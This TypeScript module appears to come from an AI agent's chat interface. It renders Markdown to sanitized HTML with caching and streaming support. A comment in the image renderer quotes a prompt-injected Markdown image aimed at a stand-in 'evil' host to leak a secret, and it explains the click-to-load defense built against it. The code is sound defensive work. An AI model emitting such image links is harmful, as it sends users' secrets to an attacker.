import { Marked } from "marked";
import DOMPurify from "dompurify";
import { getLang, t } from "./i18n";
import { remoteImageHost } from "./remote-image";
import { cleanWorkdirPath, filePathOf, isImagePath, isLocalFilePath, isWorkdirPath } from "./files";
import { MARKED_OPTIONS, blocksOf, hideFenceTail, streamSplit } from "./markdown-split";

const md = new Marked(MARKED_OPTIONS);

const escapeHtml = (s: string) =>
	s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");

/** A picture on the server: Markdown.svelte fetches it with the token and swaps this placeholder for the image. */
function wdImage(href: string, text: string): string {
	const alt = escapeHtml(text || "");
	const path = filePathOf(href);
	return `<span class="wd-img" data-wd-src="${escapeHtml(path)}" data-alt="${alt}">${alt || escapeHtml(path)}</span>`;
}

md.use({
	renderer: {
		// Code blocks get a header with a copy button; MarkdownView wires up the click via delegation.
		code({ text, lang }) {
			const label = (lang ?? "").split(/\s/)[0] ?? "";
			return (
				`<div class="codeblock"><div class="codehead"><span>${escapeHtml(label || "text")}</span>` +
				`<button type="button" class="copy" data-copy aria-label="${escapeHtml(t("코드 복사"))}">${escapeHtml(t("복사"))}</button></div>` +
				`<pre><code>${escapeHtml(text)}</code></pre></div>`
			);
		},
		link({ href, title, text, tokens }) {
			const inner = this.parser.parseInline(tokens);
			const t = title ? ` title="${escapeHtml(title)}"` : "";
			// A link to a picture on the server is the picture: shown inline (and enlarged on click) like `![](...)`.
			if ((isWorkdirPath(href) || isLocalFilePath(href)) && isImagePath(href)) return wdImage(href, text);
			// A relative link is a file in the session's working directory (the agent wrote it): preview it in the app.
			if (isWorkdirPath(href)) return `<a href="#" class="wd-file"${t} data-file="${escapeHtml(cleanWorkdirPath(href))}">${inner}</a>`;
			return `<a href="${escapeHtml(href)}"${t} data-ext rel="noopener noreferrer">${inner}</a>`;
		},
		// A remote image is fetched the moment it is in the DOM, so a prompt-injected `![](https://evil/?d=<secret>)`
		// would leak data without any click. Images therefore render as a button; the image loads only when the
		// user presses it (see Markdown.svelte). Raw HTML <img> is dropped by the sanitizer below.
		image({ href, text }) {
			const alt = escapeHtml(text || "");
			// Our own server's file, not a third party: Markdown.svelte fetches it with the token and shows it inline.
			if (isWorkdirPath(href) || isLocalFilePath(href)) return wdImage(href, text);
			const host = remoteImageHost(href);
			if (!host) return alt;
			return (
				`<button type="button" class="remote-img" data-img-src="${escapeHtml(href)}" data-alt="${alt}">` +
				`${escapeHtml(t("원격 이미지 불러오기 ({host})", { host }))}</button>`
			);
		},
		table({ header, rows }) {
			const head = header.map((c) => `<th>${this.parser.parseInline(c.tokens)}</th>`).join("");
			const body = rows.map((r) => `<tr>${r.map((c) => `<td>${this.parser.parseInline(c.tokens)}</td>`).join("")}</tr>`).join("");
			return `<div class="tablewrap"><table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table></div>`;
		},
	},
});

DOMPurify.addHook("afterSanitizeAttributes", (node) => {
	if (node.tagName === "A") {
		node.setAttribute("rel", "noopener noreferrer");
	}
});

const cache = new Map<string, string>();

export function renderMarkdown(src: string, opts: { cache?: boolean } = {}): string {
	// The code-block header is translated, so the cache is per language (and reading it re-renders on a switch).
	const key = `${getLang()}\u0000${src}`;
	const hit = cache.get(key);
	if (hit !== undefined) return hit;
	// Streaming produces a new prefix every frame; caching those would evict the finished messages the cache is for.
	const store = opts.cache ?? true;
	const html = DOMPurify.sanitize(md.parse(src, { async: false }) as string, {
		ADD_ATTR: ["data-copy", "data-ext", "data-img-src", "data-alt", "data-file", "data-wd-src"],
		FORBID_TAGS: ["style", "form", "input", "iframe", "object", "embed", "img", "picture", "source", "video", "audio", "link", "meta"],
	});
	// Finished messages are re-rendered on every sidebar toggle; keep a small cache for them.
	if (store && src.length < 20_000) {
		if (cache.size > 300) cache.delete(cache.keys().next().value!);
		cache.set(key, html);
	}
	return html;
}

/** Settled blocks of answers being streamed, kept apart so they never push finished messages out of `cache`. */
const blockCache = new Map<string, string>();

/**
 * A streaming answer as HTML. Every block above the one being written is rendered on its own and cached (top-level
 * blocks render independently, so the pieces join into the same HTML as a full parse); only the tail is parsed again.
 */
export function renderStreaming(full: string): string {
	const src = hideFenceTail(full);
	const cut = streamSplit(src);
	if (!cut) return renderMarkdown(src, { cache: false });
	let head = "";
	for (const raw of blocksOf(src.slice(0, cut))) {
		const key = `${getLang()}\u0000${raw}`;
		let html = blockCache.get(key);
		if (html === undefined) {
			html = renderMarkdown(raw, { cache: false });
			if (blockCache.size > 400) blockCache.delete(blockCache.keys().next().value!);
			blockCache.set(key, html);
		}
		head += html;
	}
	return head + renderMarkdown(src.slice(cut), { cache: false });
}
